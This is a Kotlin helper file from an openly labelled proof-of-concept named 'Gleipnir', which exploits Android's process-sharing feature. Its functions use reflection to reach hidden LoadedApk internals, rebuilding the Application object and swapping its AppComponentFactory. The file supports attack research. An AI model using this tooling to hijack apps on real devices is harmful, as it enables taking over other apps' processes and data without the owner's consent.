/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import android.app.AppComponentFactory
import android.app.Application
import android.app.Instrumentation
import android.content.pm.ApplicationInfo
import android.util.Log
import org.gleipnir.app.reflectionHelper.getDeclaredMethod
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective
import java.lang.reflect.Method

fun updateApplicationInfo(loadedApk: Any, applicationInfo: ApplicationInfo) {
    val updateApplicationInfoMethod = getDeclaredMethod(
        loadedApk::class.java,
        "updateApplicationInfo",
            ApplicationInfo::class.java,
            List::class.java

    ) as Method
    updateApplicationInfoMethod.isAccessible = true
    updateApplicationInfoMethod.invoke(loadedApk, applicationInfo, null)
}

fun makeApplication(loadedApk: Any, instrumentation: Instrumentation): Any {

    setReflective(loadedApk, "mApplication", null)
    val makeApplicationMethod = getDeclaredMethod(
        loadedApk::class.java,
        "makeApplication",
            java.lang.Boolean.TYPE,
            Instrumentation::class.java

    ) as Method
    makeApplicationMethod.isAccessible = true
    val application = makeApplicationMethod.invoke(loadedApk, false, instrumentation) as Application
    Log.d("LoadedApkExtension", "Got application ${application.packageName}")
    return application
}

fun setAppComponentFactory(loadedApk: Any, appComponentFactory: AppComponentFactory) {
    setReflective(loadedApk, "mAppComponentFactory", appComponentFactory)
}


fun getAppComponentFactory(loadedApk: Any):AppComponentFactory {
    return getReflective<AppComponentFactory>(loadedApk, "mAppComponentFactory") as AppComponentFactory
}